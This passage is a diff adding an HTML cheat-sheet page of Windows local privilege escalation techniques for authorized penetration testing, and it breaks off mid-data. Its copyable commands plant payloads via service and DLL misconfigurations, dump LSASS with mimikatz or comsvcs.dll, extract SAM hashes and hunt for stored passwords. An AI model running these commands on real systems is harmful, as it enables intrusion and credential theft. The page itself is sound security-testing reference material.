@@ -1,0 +1,1577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LPE Field Notes — Local Privilege Escalation Reference</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0e1015;
+    --bg-alt:#0b0d11;
+    --panel:#151824;
+    --panel-2:#1b1f2c;
+    --border:#262b3a;
+    --border-soft:#1e2230;
+    --text:#e8e7e3;
+    --muted:#8b90a3;
+    --muted-2:#5e6478;
+
+    --win:#e0975a;
+    --win-soft:rgba(224,151,90,.13);
+    --win-line:rgba(224,151,90,.35);
+
+    --lin:#c9b458;
+    --lin-soft:rgba(201,180,88,.13);
+    --lin-line:rgba(201,180,88,.35);
+
+    --crit:#d1665f;
+    --high:#dd8f52;
+    --med:#c9b458;
+    --low:#6fae8a;
+    --info:#6d8fc9;
+
+    --code-bg:#0a0c11;
+    --radius:3px;
+    --font-display:'Space Grotesk', sans-serif;
+    --font-body:'Inter', -apple-system, sans-serif;
+    --font-mono:'JetBrains Mono', 'SFMono-Regular', Consolas, monospace;
+  }
+
+  *{box-sizing:border-box; margin:0; padding:0;}
+  html{scroll-behavior:smooth;}
+  body{
+    background:var(--bg);
+    color:var(--text);
+    font-family:var(--font-body);
+    font-size:15px;
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+  }
+  ::selection{background:var(--win-soft); color:var(--text);}
+
+  a{color:inherit; text-decoration:none;}
+
+  /* ---------- layout shell ---------- */
+  .shell{
+    display:grid;
+    grid-template-columns:290px 1fr;
+    min-height:100vh;
+  }
+
+  /* ---------- sidebar ---------- */
+  .sidebar{
+    background:var(--bg-alt);
+    border-right:1px solid var(--border-soft);
+    position:sticky;
+    top:0;
+    height:100vh;
+    overflow-y:auto;
+    padding:22px 18px 40px;
+  }
+  .sidebar::-webkit-scrollbar{width:8px;}
+  .sidebar::-webkit-scrollbar-thumb{background:var(--border); border-radius:4px;}
+
+  .brand{
+    display:flex;
+    align-items:baseline;
+    gap:8px;
+    margin-bottom:4px;
+  }
+  .brand-mark{
+    font-family:var(--font-mono);
+    font-size:12px;
+    color:var(--bg-alt);
+    background:linear-gradient(135deg, var(--win), var(--lin));
+    padding:2px 6px;
+    border-radius:2px;
+    font-weight:600;
+    letter-spacing:.02em;
+  }
+  .brand h1{
+    font-family:var(--font-display);
+    font-size:17px;
+    font-weight:600;
+    letter-spacing:-.01em;
+  }
+  .brand-sub{
+    font-size:12px;
+    color:var(--muted-2);
+    margin-top:6px;
+    margin-bottom:18px;
+    line-height:1.5;
+  }
+  .brand-sub .author{color:var(--muted); font-family:var(--font-mono);}
+
+  .search-wrap{position:relative; margin-bottom:20px;}
+  #search{
+    width:100%;
+    background:var(--panel);
+    border:1px solid var(--border);
+    color:var(--text);
+    font-family:var(--font-mono);
+    font-size:13px;
+    padding:9px 10px 9px 30px;
+    border-radius:var(--radius);
+    outline:none;
+    transition:border-color .15s;
+  }
+  #search:focus{border-color:var(--muted-2);}
+  #search::placeholder{color:var(--muted-2);}
+  .search-icon{
+    position:absolute; left:10px; top:50%; transform:translateY(-50%);
+    width:13px; height:13px; opacity:.5;
+  }
+  .search-count{font-size:11px; color:var(--muted-2); margin-top:6px; font-family:var(--font-mono); min-height:14px;}
+
+  nav.tree{font-size:13px;}
+  .tree-os{margin-bottom:6px;}
+  .tree-os-label{
+    display:flex; align-items:center; gap:7px;
+    font-family:var(--font-display);
+    font-weight:600;
+    font-size:13px;
+    padding:9px 6px;
+    color:var(--text);
+    border-radius:var(--radius);
+    cursor:pointer;
+  }
+  .tree-os-label:hover{background:var(--panel);}
+  .dot{width:7px; height:7px; border-radius:50%; flex-shrink:0;}
+  .dot.win{background:var(--win);}
+  .dot.lin{background:var(--lin);}
+  .tree-cats{padding-left:20px; border-left:1px solid var(--border-soft); margin-left:9px;}
+  .tree-cat{padding:5px 6px; color:var(--muted); cursor:pointer; border-radius:var(--radius); font-size:12.5px;}
+  .tree-cat:hover{color:var(--text); background:var(--panel);}
+  .tree-cat.active{color:var(--text); background:var(--panel-2);}
+  .tree-cat .n{color:var(--muted-2); font-family:var(--font-mono); font-size:10.5px;}
+
+  .legend{
+    margin-top:24px; padding-top:16px; border-top:1px solid var(--border-soft);
+    font-size:11px; color:var(--muted-2);
+  }
+  .legend-title{font-family:var(--font-mono); text-transform:uppercase; letter-spacing:.08em; font-size:10px; color:var(--muted-2); margin-bottom:8px;}
+  .legend-row{display:flex; align-items:center; gap:7px; margin-bottom:5px;}
+  .sev-chip{width:8px; height:8px; border-radius:2px; flex-shrink:0;}
+
+  /* ---------- main content ---------- */
+  main{padding:0; overflow-x:hidden;}
+
+  .hero{
+    padding:56px 56px 40px;
+    border-bottom:1px solid var(--border-soft);
+    background:
+      radial-gradient(ellipse 700px 300px at 15% 0%, var(--win-soft), transparent 60%),
+      radial-gradient(ellipse 700px 300px at 85% 0%, var(--lin-soft), transparent 60%);
+  }
+  .hero-eyebrow{font-family:var(--font-mono); font-size:12px; color:var(--muted); margin-bottom:14px;}
+  .hero h2{
+    font-family:var(--font-display);
+    font-size:38px;
+    font-weight:600;
+    letter-spacing:-.015em;
+    max-width:760px;
+    line-height:1.15;
+  }
+  .hero h2 .grad-win{color:var(--win);}
+  .hero h2 .grad-lin{color:var(--lin);}
+  .hero p.lead{
+    max-width:620px; margin-top:16px; color:var(--muted); font-size:15px;
+  }
+  .stats-row{display:flex; gap:28px; margin-top:28px; flex-wrap:wrap;}
+  .stat{border-left:2px solid var(--border); padding-left:12px;}
+  .stat b{display:block; font-family:var(--font-display); font-size:22px; font-weight:600;}
+  .stat span{font-size:11.5px; color:var(--muted-2); text-transform:uppercase; letter-spacing:.06em;}
+
+  .disclaimer{
+    margin-top:26px; padding:12px 14px; border:1px solid var(--border);
+    border-radius:var(--radius); background:var(--panel); max-width:720px;
+    font-size:12.5px; color:var(--muted); display:flex; gap:10px;
+  }
+  .disclaimer b{color:var(--text);}
+
+  .os-section{padding:8px 56px 20px;}
+  .os-header{
+    display:flex; align-items:center; gap:12px;
+    padding:44px 0 18px; position:sticky; top:0; background:var(--bg); z-index:5;
+  }
+  .os-header h3{
+    font-family:var(--font-display); font-size:23px; font-weight:600;
+  }
+  .os-header .os-tag{
+    font-family:var(--font-mono); font-size:11px; padding:3px 8px; border-radius:12px; border:1px solid;
+  }
+  #windows .os-header .os-tag{color:var(--win); border-color:var(--win-line); background:var(--win-soft);}
+  #linux .os-header .os-tag{color:var(--lin); border-color:var(--lin-line); background:var(--lin-soft);}
+  .os-header .os-line{flex:1; height:1px; background:var(--border-soft);}
+
+  .category-block{margin-bottom:8px;}
+  .category-title{
+    font-family:var(--font-mono);
+    font-size:12px;
+    letter-spacing:.05em;
+    text-transform:uppercase;
+    color:var(--muted);
+    margin:30px 0 14px;
+    display:flex; align-items:center; gap:8px;
+    scroll-margin-top:70px;
+  }
+  .category-title::before{content:''; width:14px; height:1px; background:var(--border);}
+
+  .card{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:6px;
+    margin-bottom:14px;
+    overflow:hidden;
+    transition:border-color .15s;
+  }
+  .card:hover{border-color:var(--border-soft); border-color:#333850;}
+  .card.hidden{display:none;}
+
+  .card-head{
+    display:flex; align-items:flex-start; justify-content:space-between; gap:16px;
+    padding:16px 18px 12px;
+    cursor:pointer;
+  }
+  .card-title-wrap{display:flex; flex-direction:column; gap:5px;}
+  .card-title{font-family:var(--font-display); font-size:16px; font-weight:600;}
+  .card-summary{font-size:13px; color:var(--muted); max-width:640px;}
+  .card-meta{display:flex; gap:8px; align-items:center; flex-shrink:0;}
+  .sev{
+    font-family:var(--font-mono); font-size:10.5px; padding:3px 7px; border-radius:10px;
+    text-transform:uppercase; letter-spacing:.04em; white-space:nowrap; border:1px solid;
+  }
+  .sev.crit{color:var(--crit); border-color:rgba(209,102,95,.4); background:rgba(209,102,95,.1);}
+  .sev.high{color:var(--high); border-color:rgba(221,143,82,.4); background:rgba(221,143,82,.1);}
+  .sev.med{color:var(--med); border-color:rgba(201,180,88,.4); background:rgba(201,180,88,.1);}
+  .sev.low{color:var(--low); border-color:rgba(111,174,138,.4); background:rgba(111,174,138,.1);}
+  .sev.info{color:var(--info); border-color:rgba(109,143,201,.4); background:rgba(109,143,201,.1);}
+
+  .chevron{width:14px; height:14px; color:var(--muted-2); transition:transform .15s; flex-shrink:0; margin-top:4px;}
+  .card.open .chevron{transform:rotate(90deg);}
+
+  .card-body{
+    max-height:0; overflow:hidden; transition:max-height .25s ease;
+  }
+  .card.open .card-body{max-height:4000px;}
+  .card-body-inner{padding:0 18px 20px;}
+
+  .card-body-inner .section-label{
+    font-family:var(--font-mono); font-size:10.5px; text-transform:uppercase; letter-spacing:.06em;
+    color:var(--muted-2); margin:14px 0 8px;
+  }
+  .card-body-inner p{font-size:13.5px; color:#c7c6c2; margin-bottom:8px;}
+
+  .step{margin-bottom:12px;}
+  .step-label{font-size:12.5px; color:var(--muted); margin-bottom:5px; display:flex; gap:6px; align-items:center;}
+  .step-label .idx{color:var(--muted-2); font-family:var(--font-mono);}
+
+  .code-block{
+    position:relative;
+    background:var(--code-bg);
+    border:1px solid var(--border-soft);
+    border-radius:4px;
+    overflow:hidden;
+  }
+  .code-block pre{
+    padding:12px 40px 12px 14px;
+    overflow-x:auto;
+    font-family:var(--font-mono);
+    font-size:12.5px;
+    line-height:1.65;
+    color:#d6d5cf;
+  }
+  .code-block .cmt{color:#5e6478; font-style:normal;}
+  .copy-btn{
+    position:absolute; top:8px; right:8px;
+    background:var(--panel-2); border:1px solid var(--border);
+    color:var(--muted); font-family:var(--font-mono); font-size:10.5px;
+    padding:4px 8px; border-radius:3px; cursor:pointer;
+  }
+  .copy-btn:hover{color:var(--text); border-color:var(--muted-2);}
+  .copy-btn.copied{color:var(--low); border-color:rgba(111,174,138,.4);}
+
+  .notes-box{
+    margin-top:10px; padding:10px 12px; border-left:2px solid var(--border);
+    font-size:12.5px; color:var(--muted); background:var(--panel-2); border-radius:0 4px 4px 0;
+  }
+  .notes-box b{color:var(--text); font-weight:500;}
+
+  .tag-row{display:flex; gap:6px; flex-wrap:wrap; margin-top:12px;}
+  .tag{
+    font-family:var(--font-mono); font-size:10px; color:var(--muted-2);
+    border:1px solid var(--border-soft); padding:2px 6px; border-radius:10px;
+  }
+
+  footer{
+    padding:40px 56px 70px; color:var(--muted-2); font-size:12px; border-top:1px solid var(--border-soft); margin-top:20px;
+  }
+  footer a{border-bottom:1px dotted var(--muted-2);}
+
+  .no-results{display:none; padding:40px 0; color:var(--muted-2); font-size:13px; font-family:var(--font-mono);}
+
+  @media (max-width:900px){
+    .shell{grid-template-columns:1fr;}
+    .sidebar{position:relative; height:auto; max-height:340px;}
+    .hero, .os-section, footer{padding-left:22px; padding-right:22px;}
+    .hero h2{font-size:28px;}
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    *{transition:none !important; scroll-behavior:auto !important;}
+  }
+
+  :focus-visible{outline:2px solid var(--muted); outline-offset:2px;}
+</style>
+</head>
+<body>
+
+<div class="shell">
+  <!-- ================= SIDEBAR ================= -->
+  <aside class="sidebar">
+    <div class="brand">
+      <span class="brand-mark">LPE</span>
+      <h1>Field Notes</h1>
+    </div>
+    <p class="brand-sub">Local privilege escalation reference for authorized engagements. Structure adapted from <span class="author">Sagi Shahar (@s4gi_)</span>'s LPE mind map.</p>
+
+    <div class="search-wrap">
+      <svg class="search-icon" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.6"><circle cx="9" cy="9" r="6.2"/><path d="M13.4 13.4L17.5 17.5"/></svg>
+      <input id="search" type="text" placeholder="search techniques, commands..." autocomplete="off">
+    </div>
+    <div class="search-count" id="searchCount"></div>
+
+    <nav class="tree" id="tree"></nav>
+
+    <div class="legend">
+      <div class="legend-title">Severity legend</div>
+      <div class="legend-row"><span class="sev-chip" style="background:var(--crit)"></span>Critical — near-guaranteed SYSTEM/root</div>
+      <div class="legend-row"><span class="sev-chip" style="background:var(--high)"></span>High — reliable given common misconfig</div>
+      <div class="legend-row"><span class="sev-chip" style="background:var(--med)"></span>Medium — situational / needs conditions</div>
+      <div class="legend-row"><span class="sev-chip" style="background:var(--low)"></span>Low — supporting technique / info gather</div>
+      <div class="legend-row"><span class="sev-chip" style="background:var(--info)"></span>Info — enumeration / recon only</div>
+    </div>
+  </aside>
+
+  <!-- ================= MAIN ================= -->
+  <main>
+    <section class="hero">
+      <div class="hero-eyebrow">// internal reference — authorized testing only</div>
+      <h2>Local Privilege Escalation <span class="grad-win">Windows</span> &amp; <span class="grad-lin">Linux</span> cheat sheet</h2>
+      <p class="lead">Every technique below moves from enumeration to exploitation to cleanup awareness. Each command block explains what it does and why it works — treat this as a field companion, not a substitute for understanding the underlying misconfiguration.</p>
+      <div class="stats-row" id="statsRow"></div>
+      <div class="disclaimer">
+        <span>⚠</span>
+        <span><b>Scope discipline.</b> Only run these against systems you are explicitly authorized to test (signed rules of engagement / your own lab). Local privilege escalation almost always creates artifacts — new processes, scheduled tasks, registry keys, SUID bits, cron entries. Log what you change and revert it during cleanup.</span>
+      </div>
+    </section>
+
+    <div id="windows" class="os-section"></div>
+    <div id="linux" class="os-section"></div>
+
+    <footer>
+      Field notes are a starting point, not a replacement for reading the actual documentation of the tool or misconfiguration class you're exploiting. Cross-reference with GTFOBins, LOLBAS, HackTricks, and the official vendor advisories before relying on any single technique in a live engagement.
+    </footer>
+  </main>
+</div>
+
+<script>
+/* =========================================================================
+   DATA MODEL
+   Each OS has categories, each category has techniques ("cards").
+   Cards contain: title, severity, summary, steps [{label, code, comment?}],
+   notes (array of strings), tags.
+========================================================================= */
+
+const esc = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+// Renders a code block with inline "# comment" style annotations preserved.
+function codeBlock(lines){
+  const html = lines.map(l => esc(l)).join('\n');
+  return `<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><pre>${html}</pre></div>`;
+}
+
+const DATA = {
+  windows: {
+    label: "Windows",
+    dot: "win",
+    intro: "Windows privesc leans heavily on misconfigured services, weak file/registry ACLs, credentials left on disk or in memory, and scheduled-task or startup abuse. Always run baseline enumeration before chasing individual techniques.",
+    categories: [
+      {
+        id: "win-baseline",
+        name: "Baseline Enumeration",
+        cards: [
+          {
+            title: "System &amp; privilege baseline",
+            severity: "info",
+            summary: "Establish OS build, patch level, current privileges, and installed AV/EDR before doing anything else.",
+            steps: [
+              {label:"Host and patch context", code:[
+                "systeminfo",
+                "# Full OS build, hotfix list, architecture — cross-reference hotfix",
+                "# list against known local kernel/MS exploits (e.g. via Watson or",
+                "# Sherlock) before trying anything noisy.",
+              ]},
+              {label:"Current identity and rights", code:[
+                "whoami /all",
+                "# Prints SID, group memberships, and — critically — the token",
+                "# privileges you currently hold (look for SeImpersonate,",
+                "# SeAssignPrimaryToken, SeBackup, SeRestore, SeDebug, SeTakeOwnership,",
+                "# SeLoadDriver — each maps to a specific privesc primitive).",
+              ]},
+              {label:"Automated triage tools", code:[
+                "winPEASx64.exe                 # colour-coded automated enumeration",
+                "PowerUp.ps1 -> Invoke-AllChecks # PowerShell service/registry/task checks",
+                "Seatbelt.exe -group=all         # broad host survey, safer / more OPSEC options",
+                "# Automated tools are a starting point for triage, not a substitute for",
+                "# manually confirming a finding before you act on it.",
+              ]},
+            ],
+            notes:["Run this pass every time — a technique that worked on one build may be patched on another, and token privileges change per-session (e.g. across a service account vs an interactive shell)."],
+            tags:["recon","token-privileges","triage"]
+          }
+        ]
+      },
+      {
+        id: "win-services",
+        name: "Services",
+        cards: [
+          {
+            title: "Unquoted service paths",
+            severity: "high",
+            summary: "A service binary path containing spaces but no quotes lets Windows try each space-delimited segment as a candidate executable — plant a binary in the first writable segment.",
+            steps: [
+              {label:"Find candidates", code:[
+                'wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\\\Windows\\\\" | findstr /i /v """',
+                "# Lists services whose ImagePath is unquoted and contains a space",
+                "# outside C:\\Windows — these are exploitable if you can write to",
+                "# one of the intermediate path segments.",
+              ]},
+              {label:"Check writability of each path segment", code:[
+                'icacls "C:\\Program Files\\Vulnerable App\\"',
+                "# Confirm BUILTIN\\Users or your current principal has (W)rite or",
+                "# (F)ull to the directory. If C:\\Program.exe or C:\\Program Files\\",
+                "# Vulnerable.exe is writable, that's your drop point.",
+              ]},
+              {label:"Drop payload and restart the service", code:[
+                'copy payload.exe "C:\\Program Files\\Vulnerable.exe"',
+                "sc stop VulnSvc & sc start VulnSvc",
+                "# Windows resolves the unquoted path left-to-right; a match on the",
+                "# earliest segment executes before the real intended binary.",
+              ]},
+            ],
+            notes:["If you can't restart the service yourself, it may run on next reboot, on a schedule, or after a crash — check the service's start type first."],
+            tags:["services","file-write","auto-restart"]
+          },
+          {
+            title: "Weak service binary / folder permissions",
+            severity: "high",
+            summary: "You don't need an unquoted path if the service executable itself, or its containing folder, grants you write access — just overwrite the binary outright.",
+            steps: [
+              {label:"Enumerate service binary ACLs", code:[
+                "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
+                "# Lists services where Authenticated Users (or another low-priv",
+                "# group you belong to) has SERVICE_ALL_ACCESS or WRITE/CHANGE_CONFIG.",
+              ]},
+              {label:"Confirm and act", code:[
+                'sc qc VulnSvc',
+                "# Confirm binPath and the account it runs as (LocalSystem is the goal).",
+                "copy /y payload.exe C:\\VulnPath\\service.exe",
+                "sc stop VulnSvc & sc start VulnSvc",
+              ]},
+            ],
+            notes:["A payload here is typically a reverse shell or a local-admin-adding one-liner — remember it runs as whatever account the service runs as, not as you."],
+            tags:["services","icacls","accesschk"]
+          },
+          {
+            title: "Modify service binPath directly",
+            severity: "high",
+            summary: "If your account holds SERVICE_CHANGE_CONFIG rights on a service (even without file-system write anywhere), you can repoint the service's executable entirely.",
+            steps: [
+              {label:"Change the binary path and restart", code:[
+                'sc config VulnSvc binPath= "C:\\Windows\\Temp\\payload.exe"',
+                "sc config VulnSvc obj= LocalSystem",
+                "net stop VulnSvc & net start VulnSvc",
+                "# sc config rewrites the service's ImagePath registry value directly;",
+                "# no file overwrite needed at all if you have this registry/service ACL.",
+              ]},
+            ],
+            notes:["Also check HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> registry ACLs directly with accesschk -- the registry key itself is sometimes writable even when sc reports access denied."],
+            tags:["services","registry","binpath"]
+          },
+          {
+            title: "DLL hijacking",
+            severity: "med",
+            summary: "A privileged process loads a DLL by name without a fully-qualified path; Windows' DLL search order lets you plant a malicious DLL earlier in the search path than the legitimate one.",
+            steps: [
+              {label:"Identify missing/hijackable DLL loads", code:[
+                "procmon.exe   # filter: Result = NAME NOT FOUND, Path ends with .dll",
+                "# Run the target service/app under Procmon and watch for DLL load",
+                "# attempts that fail because the DLL isn't in that directory.",
+              ]},
+              {label:"Check search-order writability", code:[
+                'icacls "C:\\Program Files\\VulnApp\\"',
+                "# Windows' default search order: app directory -> System32 ->",
+                "# System -> Windows -> CWD -> PATH dirs. Anything writable earlier",
+                "# in that chain than the real DLL's location is exploitable.",
+              ]},
+              {label:"Plant and trigger", code:[
+                "copy payload.dll \"C:\\Program Files\\VulnApp\\missing.dll\"",
+                "# Restart the service/app (or wait for its natural trigger) so it",
+                "# loads your DLL under its own (often SYSTEM) privileges.",
+              ]},
+            ],
+            notes:["Check whether SafeDllSearchMode is enabled (default on modern Windows) — it changes the exact search order but does not eliminate the class of bug."],
+            tags:["dll-hijack","procmon","search-order"]
+          },
+          {
+            title: "Named pipe impersonation",
+            severity: "high",
+            summary: "A privileged process connects to a named pipe you control; with SeImpersonatePrivilege you can impersonate the connecting client's token.",
+            steps: [
+              {label:"Check for the required privilege", code:[
+                "whoami /priv | findstr /i SeImpersonatePrivilege",
+                "# Present-and-enabled on many service accounts (IIS, MSSQL) by",
+                "# default — this is the precondition for the whole technique class.",
+              ]},
+              {label:"Create the pipe and coerce a connection", code:[
+                "# Using a tool such as RogueWinRM / PrintSpoofer / EfsPotato depending",
+                "# on OS build — they automate: create pipe -> trigger a SYSTEM",
+                "# service to connect -> ImpersonateNamedPipeClient -> spawn SYSTEM shell.",
+                "PrintSpoofer.exe -i -c \"cmd /c whoami\"",
+              ]},
+            ],
+            notes:["This is the modern umbrella for what used to be called 'Potato' attacks (see the dedicated Hot Potato entry below) — tool choice depends on patch level."],
+            tags:["named-pipes","seimpersonate","potato"]
+          },
+          {
+            title: "Registry — service key permissions",
+            severity: "high",
+            summary: "Even without SERVICE_CHANGE_CONFIG on the service object, direct write access to its registry key achieves the same result.",
+            steps: [
+              {label:"Enumerate writable service keys", code:[
+                'accesschk.exe -kvuqsw hklm\\system\\currentcontrolset\\services /accepteula',
+                "# Look for SET_VALUE / FULL_CONTROL granted to a group you belong to.",
+              ]},
+              {label:"Rewrite ImagePath", code:[
+                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc" /v ImagePath /t REG_EXPAND_SZ /d "C:\\Windows\\Temp\\payload.exe" /f',
+                "net stop VulnSvc & net start VulnSvc",
+              ]},
+            ],
+            notes:[],
+            tags:["registry","services"]
+          }
+        ]
+      },
+      {
+        id: "win-kernel",
+        name: "Kernel",
+        cards: [
+          {
+            title: "Missing kernel patch exploits",
+            severity: "crit",
+            summary: "Match the exact build/hotfix level against public kernel exploits (privilege escalation via driver bugs, token stealing, etc.).",
+            steps: [
+              {label:"Pull patch level", code:[
+                "systeminfo",
+                "wmic qfe list",
+                "# Gather installed hotfix IDs (KBxxxxxxx) for offline comparison.",
+              ]},
+              {label:"Cross-reference against known exploits", code:[
+                "# Run the hotfix list through a matcher such as Watson or Sherlock",
+                "# (transfer output off-box for offline matching where possible to",
+                "# reduce noise on the target).",
+                "Watson.exe",
+              ]},
+            ],
+            notes:["Kernel exploits are high-impact but also high-risk — a bad one can BSOD the host. Prefer a userland/misconfiguration path when one exists, and always test in a lab that mirrors the target build first."],
+            tags:["kernel","cve","bsod-risk"]
+          }
+        ]
+      },
+      {
+        id: "win-passmine",
+        name: "Password Mining",
+        cards: [
+          {
+            title: "Registry — cached credentials",
+            severity: "high",
+            summary: "Several applications historically stashed credentials or session data in the registry in recoverable form.",
+            steps: [
+              {label:"PuTTY saved sessions", code:[
+                'reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s',
+                "# Saved sessions can include proxy credentials and, in older",
+                "# configs, an obfuscated (not encrypted) private key path/passphrase.",
+              ]},
+              {label:"Autologon credentials", code:[
+                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
+                "# DefaultUserName / DefaultPassword / DefaultDomainName are stored",
+                "# in cleartext when autologon is configured for kiosk-style hosts.",
+              ]},
+              {label:"VNC stored passwords", code:[
+                'reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"',
+                "# VNC historically used a weak, reversible obfuscation — crackable",
+                "# with public tools (e.g. vncpwd) once extracted.",
+              ]},
+            ],
+            notes:["Registry hives can also be dumped offline (see Configuration Files > Cached SAM) if you have backup/restore privileges but not interactive read access."],
+            tags:["registry","credentials","putty","vnc"]
+          },
+          {
+            title: "Logs and .rdp files",
+            severity: "med",
+            summary: "Setup, application, and RDP connection logs occasionally leak usernames, hostnames, or full credentials from failed automation.",
+            steps: [
+              {label:"Search common log locations", code:[
+                'findstr /si password *.log *.xml *.ini *.txt 2>nul',
+                "# Broad grep across common config/log extensions for the literal",
+                "# string 'password' — cheap and surprisingly effective.",
+              ]},
+              {label:"RDP connection history", code:[
+                "dir /a /s *.rdp",
+                "# .rdp files can embed a saved, reversibly-encrypted credential",
+                "# blob (protected with DPAPI under the saving user's profile).",
+              ]},
+            ],
+            notes:[],
+            tags:["logs","rdp","grep"]
+          },
+          {
+            title: "Memory — credential harvesting",
+            severity: "crit",
+            summary: "LSASS process memory holds plaintext/hashed credentials for every logged-on account since the last boot or logon.",
+            steps: [
+              {label:"Dump LSASS (requires local admin / SeDebugPrivilege)", code:[
+                "mimikatz # privilege::debug",
+                "mimikatz # sekurlsa::logonpasswords",
+                "# Extracts plaintext passwords (if WDigest is enabled) or NTLM",
+                "# hashes for every session token LSASS is holding.",
+              ]},
+              {label:"Or dump quietly for offline parsing", code:[
+                "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\Temp\\lsass.dmp full",
+                "# Uses a signed Windows binary (comsvcs.dll) instead of dropping",
+                "# mimikatz to disk — lower signature-based detection footprint.",
+                "# Parse the .dmp offline with mimikatz's minidump module.",
+              ]},
+            ],
+            notes:["This requires you already have local admin or an equivalent privilege — it's a lateral-movement / credential-theft primitive more than a privesc primitive on its own, but it's central to most Windows engagements and belongs in the same workflow."],
+            tags:["mimikatz","lsass","credential-dump","admin-required"]
+          },
+          {
+            title: "Process dump (minidump) of interactive apps",
+            severity: "med",
+            summary: "Browsers, password managers, or RDP clients sometimes hold decrypted secrets in their own process memory, separate from LSASS.",
+            steps: [
+              {label:"Dump the target process via Task Manager or procdump", code:[
+                "procdump.exe -ma <target_pid> out.dmp",
+                "# -ma takes a full memory dump; then string-search or use a",
+                "# credential-scraping tool (e.g. a mimikatz-style parser) against it.",
+              ]},
+              {label:"Search the dump for likely secrets", code:[
+                'strings out.dmp | findstr /i "password= pwd= secret="',
+              ]},
+            ],
+            notes:[],
+            tags:["memory","procdump"]
+          }
+        ]
+      },
+      {
+        id: "win-configfiles",
+        name: "Configuration Files",
+        cards: [
+          {
+            title: "unattend.xml / sysprep leftovers",
+            severity: "high",
+            summary: "Automated deployment leaves configuration files containing the local administrator password in Base64 — routinely left on disk after imaging.",
+            steps: [
+              {label:"Search default locations", code:[
+                "dir /s /b C:\\unattend.xml",
+                "dir /s /b C:\\Windows\\Panther\\unattend.xml",
+                "dir /s /b C:\\Windows\\Panther\\Unattend\\Unattend.xml",
+                "dir /s /b C:\\Windows\\System32\\sysprep.inf",
+                "dir /s /b C:\\Windows\\System32\\sysprep\\sysprep.xml",
+              ]},
+              {label:"Decode the recovered password", code:[
+                'type C:\\unattend.xml | findstr /i password',
+                "# certutil -decode <file> out.txt   (to Base64-decode the blob if needed)",
+                "# The <Password><Value> element is Base64 of the password + a fixed",
+                "# suffix ('AdministratorPassword'); strip the suffix after decoding.",
+              ]},
+            ],
+            notes:["Also check %WINDIR%\\Panther\\Unattend* variants and any network deployment shares if you have read access."],
+            tags:["unattend","sysprep","imaging"]
+          },
+          {
+            title: "Application configs: SiteList.xml, web.config, vnc.ini",
+            severity: "med",
+            summary: "Several products historically stored credentials in weakly-protected or reversible form in their own config files.",
+            steps: [
+              {label:"McAfee SiteList.xml (legacy)", code:[
+                "dir /s /b SiteList.xml",
+                "# Contains a reversibly 3DES-encrypted proxy/repository password —",
+                "# public decryption tools exist for the known static key.",
+              ]},
+              {label:"IIS web.config", code:[
+                "type web.config | findstr /i connectionstring",
+                "# Database connection strings are frequently stored in plaintext",
+                "# unless protected with aspnet_regiis -pef.",
+              ]},
+              {label:"VNC vnc.ini", code:[
+                "type vnc.ini | findstr /i password",
+              ]},
+            ],
+            notes:[],
+            tags:["config-files","iis","vnc","mcafee"]
+          },
+          {
+            title: "Cached SAM / SYSTEM hive extraction",
+            severity: "high",
+            summary: "If you have file-read on the registry hive backups (or Volume Shadow Copies), you can pull local account hashes offline without touching LSASS.",
+            steps: [
+              {label:"Locate hive backups", code:[
+                "dir C:\\Windows\\System32\\config\\RegBack\\",
+                "dir C:\\Windows\\repair\\SAM",
+                "# RegBack is populated by scheduled backup tasks on some builds;",
+                "# older systems keep a copy under \\repair\\ from initial setup.",
+              ]},
+              {label:"Extract hashes offline", code:[
+                "reg save HKLM\\SAM sam.save",
+                "reg save HKLM\\SYSTEM system.save",
+                "# Transfer both files off-box and parse with a tool such as",
+                "# secretsdump.py -sam sam.save -system system.save LOCAL",
+              ]},
+            ],
+            notes:["Requires SeBackupPrivilege or local admin to read the live hive; RegBack copies may be world-readable depending on build."],
+            tags:["sam","registry-hives","offline-cracking"]
+          }
+        ]
+      },
+      {
+        id: "win-registry",
+        name: "Registry (Persistence &amp; Escalation)",
+        cards: [
+          {
+            title: "AutoRun binaries",
+            severity: "med",
+            summary: "Programs registered to run at logon frequently run in the context of whichever user logs in next — including an administrator.",
+            steps: [
+              {label:"Enumerate AutoRun keys", code:[
+                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"',
+                'reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"',
+                "# HKLM entries execute for every user that logs on — check whether",
+                "# the target binary path itself is writable by you.",
+              ]},
+              {label:"Check writability, then hijack", code:[
+                'icacls "C:\\Program Files\\AutoRunApp\\app.exe"',
+                "copy /y payload.exe \"C:\\Program Files\\AutoRunApp\\app.exe\"",
+              ]},
+            ],
+            notes:[],
+            tags:["autorun","registry","persistence"]
+          },
+          {
+            title: "AlwaysInstallElevated",
+            severity: "crit",
+            summary: "When both policy values are set to 1, any user can install an .msi package that runs with SYSTEM privileges — no admin required at all.",
+            steps: [
+              {label:"Confirm both keys are set", code:[
+                'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
+                'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
+                "# Both HKLM and HKCU must equal 1 for this to be exploitable.",
+              ]},
